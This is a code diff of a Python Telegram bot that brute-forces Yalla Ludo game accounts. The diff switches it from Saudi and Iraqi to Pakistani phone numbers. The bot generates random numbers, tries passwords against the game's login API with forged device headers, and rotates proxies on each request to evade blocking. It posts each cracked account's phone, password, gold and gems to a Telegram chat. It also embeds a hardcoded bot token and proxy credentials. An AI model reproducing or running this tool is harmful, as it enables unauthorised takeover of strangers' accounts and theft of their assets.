@@ -1,7 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# © Q_b_h — Yalla Ludo Bot Control (Multi-Session Isolated & Advanced Crypto + Proxy)
-
 import base64
 import hashlib
 import hmac as hmacmod
@@ -23,18 +19,22 @@ from Crypto.Util.Padding import pad
 import telebot
 from telebot import types
 
+# === إعدادات البروكسي الديناميكي ===
+def get_proxy():
+    """
+    توليد إعدادات بروكسي جديدة لكل عملية طلب لضمان تغيير الـ IP مع كل فحص.
+    """
+    session_id = random.randint(10000, 999999)
+    return {
+        "http": "http://330d9a235026e98dbbd8:e2737c9436c5d6c0@gw.dataimpulse.com:823",
+        "https": "http://330d9a235026e98dbbd8:e2737c9436c5d6c0@gw.dataimpulse.com:823",
+    }
+
 # === إعدادات البوت والمطور ===
 TG_TOKEN = "8208523854:AAEeI4w9VPmdKoPundR5wD3uMqmwrxj2bng"
 ADMIN_ID = 8795120325  # آيدي المطور
 
 bot = telebot.TeleBot(TG_TOKEN)
-
-# === إعدادات البروكسي الجديد ===
-PROXY_URL = "http://330d9a235026e98dbbd8:e2737c9436c5d6c0@gw.dataimpulse.com:823"
-PROXIES = {
-    "http": PROXY_URL,
-    "https": PROXY_URL
-}
 
 # === إعدادات البروتوكول والأمان المتقدمة ===
 version = '2.0'
@@ -126,12 +126,12 @@ def baggage(timestamp, device, android, shumeng, nonce):
         "deviceType": 2, "downloadChannelId": 1,
         "shuMengId": shumeng, "nonce": nonce,
         "plateType": 0, "LanguageId": 2, "phoneModel": "SM-S918B",
-        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
+        "X-Phone-Country": "PK", "X-Sim-Country": "PK",
         "AndroidId": android, "appType": 0,
     }
     return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()
 
-def buildrequest(body, country="SA"):
+def buildrequest(body, country="PK"):
     device, android, shumeng, nonce = gendevice()
     now    = int(time.time() * 1000)
     hera   = uuid.uuid4().hex
@@ -163,9 +163,9 @@ def buildrequest(body, country="SA"):
     }
     return headers, wire, hera, device, android, shumeng, nonce
 
-def build_payload(mobile, password, country="SA"):
+def build_payload(mobile, password, country="PK"):
     device, android, shumeng, nonce = gendevice()
-    area_code = "966" if country == "SA" else "964"
+    area_code = "92"
     data = {
         "mobile": mobile, "areaCode": area_code, "password": password,
         "languageId": 2, "nationalityId": "1",
@@ -220,7 +220,7 @@ def profile_baggage(timestamp, token, hera):
         "deviceType": 2, "downloadChannelId": 1,
         "shuMengId": shumeng, "nonce": nc,
         "plateType": 0, "LanguageId": 2, "phoneModel": "SM-S918B",
-        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
+        "X-Phone-Country": "PK", "X-Sim-Country": "PK",
         "AndroidId": android, "appType": 0,
     }
     return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()
@@ -253,8 +253,7 @@ def fetch_profile(token, user_id, login_data=None):
             'Content-Type': 'application/json; charset=utf-8',
         }
         try:
-            # تم إضافة البروكسي هنا
-            r   = requests.post(srv + profile_path, data=wire, headers=hdrs, timeout=10, proxies=PROXIES)
+            r   = requests.post(srv + profile_path, data=wire, headers=hdrs, proxies=get_proxy(), timeout=10)
             obj = decode_resp(r.json(), hera)
             if obj.get('status') == 0:
                 data = obj.get('data') or {}
@@ -270,15 +269,13 @@ def format_hit_message(data, mobile, password, country, prof):
     raw_name = data.get('name') or data.get('nickName', '—')
     name = html.escape(str(raw_name))
     uid  = data.get('showNumId') or data.get('id', '—')
-    area_prefix = "+966" if country == "SA" else "+964"
+    area_prefix = "+92"
 
     lines = [
-        "🎲 <b>Yalla Ludo — HIT FOUND! (صيد جديد)</b>",
-        f"📱 <b>رقم الهاتف:</b> <code>{area_prefix}{mobile}</code>",
-        f"🔑 <b>كلمة المرور:</b> <code>{password}</code>",
-        f"🆔 <b>الايدي (ID):</b> <code>{uid}</code>",
-        f"👤 <b>الاسم:</b> {name}",
-        "──────────────────────────────"
+        "<b>تم صيد حساب جديد</b>",
+        f"<b>رقم الهاتف :</b> <code>{area_prefix}{mobile}</code>",
+        f"<b>كلمة المرور :</b> <code>{password}</code>",
+        f"<b>الاسم :</b> {name}",
     ]
 
     if prof:
@@ -307,44 +304,30 @@ def format_hit_message(data, mobile, password, country, prof):
         if isinstance(wp, float): wp = f'{wp*100:.1f}%'
 
         lines.extend([
-            f"💛 <b>الذهب:</b> {gold}",
-            f"💎 <b>الجواهر:</b> {dia}",
-            "──────────────────────────────",
-            f"🏆 <b>المستوى:</b> {lvl} (XP: {exp}/{mxp})",
-            f"👑 <b>VIP:</b> {vip}",
-            f"🎖 <b>المستوى الملكي:</b> {royal}",
-            f"⚡ <b>حالة الحساب:</b> {frz}",
-            "──────────────────────────────",
-            f"🖼 <b>الإطار:</b> {frame}",
-            f"🎨 <b>البيدق/التعليقة:</b> {pend}",
-            f"🏷 <b>لوحة الاسم:</b> {npl}",
-            f"⭐ <b>النجوم:</b> {stars}",
-            "──────────────────────────────",
-            f"🎮 <b>إجمالي المباريات:</b> {tot}",
-            f"📊 <b>نسبة الفوز:</b> {wp}",
-            f"🏅 <b>الرتبة الحالية:</b> {seg} (الأعلى: {segh})",
-            f"🥇 <b>الأوسمة:</b> ذهبي {mg} | فضي {ms} | برونزي {mc}"
+            f"<b>عدد الذهب :</b> {gold}",
+            f"<b>عدد جواهر :</b> {dia}",
+            f"<b>حالة الحساب :</b> {frz}",
         ])
     else:
-        lines.append("⚠️ <i>تعذر جلب تفاصيل الملف الشخصي إضافياً</i>")
+        lines.append("⚠️ <i>الحساب طالب تحقق</i>")
 
     lines.append("\nBy - @aboodriad")
     return "\n".join(lines)
 
-# === مولد الأرقام ===
-def generate_saudi_number() -> str:
-    prefixes = ["50", "53", "54", "55", "56", "57", "58", "59"]
-    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
-
-def generate_iraqi_number() -> str:
-    prefixes = ["770", "771", "772", "773", "774", "780", "781", "782", "783", "784", "785", "786", "787", "788", "789", "790", "750", "751"]
+# === مولد الأرقام لباكستان ===
+def generate_pakistan_number() -> str:
+    prefixes = [
+        "300", "301", "302", "303", "304", "305", "306", "307", "308", "309",
+        "310", "311", "312", "313", "314", "315", "316", "317", "318",
+        "320", "321", "322", "323", "324", "330", "331", "332", "333", "334", "335", "336"
+    ]
     return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
 
 def generate_number(country: str) -> str:
-    return generate_iraqi_number() if country == "IQ" else generate_saudi_number()
+    return generate_pakistan_number()
 
 def get_country_name_label(country: str) -> str:
-    return "العراق 🇮🇶" if country == "IQ" else "السعودية 🇸🇦"
+    return "باكستان 🇵🇰"
 
 def check_subscription(user_id: int) -> bool:
     if user_id == ADMIN_ID:
@@ -365,7 +348,7 @@ def get_user_session(user_id: int) -> Dict[str, Any]:
             "valid_count": 0,
             "wrong_count": 0,
             "error_count": 0,
-            "current_country": "SA",
+            "current_country": "PK",
             "tried": set(),
             "stats_lock": threading.Lock()
         }
@@ -396,15 +379,6 @@ def get_user_keyboard(user_id: int):
         markup.add(types.InlineKeyboardButton("▶ بدء الفحص", callback_data="start_check"))
     else:
         markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
-    return markup
-
-def get_country_keyboard(is_admin: bool):
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(
-        types.InlineKeyboardButton("🇸🇦 السعودية (Saudi Arabia)", callback_data="select_country_sa"),
-        types.InlineKeyboardButton("🇮🇶 العراق (Iraq)", callback_data="select_country_iq"),
-        types.InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_admin" if is_admin else "back_to_user")
-    )
     return markup
 
 @bot.message_handler(commands=['start'])
@@ -462,24 +436,8 @@ def callback_handler(call):
         if session["is_running"]:
             bot.answer_callback_query(call.id, "⚠️ الفحص يعمل لديك بالفعل!")
             return
-        bot.answer_callback_query(call.id)
-        bot.edit_message_text(
-            "🌐 <b>اختر دولة الفحص المطلوبة:</b>",
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            parse_mode="HTML",
-            reply_markup=get_country_keyboard(is_admin)
-        )
-
-    elif call.data.startswith("select_country_"):
-        code_map = {"select_country_sa": "SA", "select_country_iq": "IQ"}
-        session["current_country"] = code_map.get(call.data, "SA")
-        country_name = get_country_name_label(session["current_country"])
-
-        if session["is_running"]:
-            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل لديك بالفعل!")
-            return
         
+        session["current_country"] = "PK"
         session["is_running"] = True
         session["stop_event"].clear()
         session["valid_count"] = 0
@@ -492,6 +450,7 @@ def callback_handler(call):
         t.start()
         session["thread"] = t
 
+        country_name = get_country_name_label(session["current_country"])
         bot.answer_callback_query(call.id, f"✅ تم بدء الفحص لدولة {country_name}")
         markup = get_control_keyboard(user_id) if is_admin else get_user_keyboard(user_id)
         bot.edit_message_text(
@@ -644,8 +603,7 @@ def run_checker_loop(chat_id, user_id, msg_id):
             headers, wire, hera = body
 
             try:
-                # تم إضافة البروكسي هنا لطلبات الفحص
-                response = requests.post(api_url, data=wire, headers=headers, timeout=15, proxies=PROXIES)
+                response = requests.post(api_url, data=wire, headers=headers, proxies=get_proxy(), timeout=15)
                 result = decode_resp(response.json(), hera)
             except Exception:
                 with session["stats_lock"]:
@@ -661,7 +619,6 @@ def run_checker_loop(chat_id, user_id, msg_id):
                     token = data.get('token', '')
                     uid = str(data.get('id') or data.get('showNumId') or '')
                     
-                    # جلب المعلومات الكاملة للحساب المصيد (باستخدام البروكسي أيضاً عبر fetch_profile)
                     prof = fetch_profile(token, uid, data)
                     hit_msg = format_hit_message(data, mobile, password, country, prof)
                     
@@ -704,5 +661,5 @@ def run_checker_loop(chat_id, user_id, msg_id):
                 pass
 
 if __name__ == "__main__":
-    print("🤖 Bot is running with isolated user sessions & Proxy configured...")
+    print("🤖 Bot is running for Pakistan (PK) with isolated user sessions & dynamic rotating proxies...")
     bot.infinity_polling()
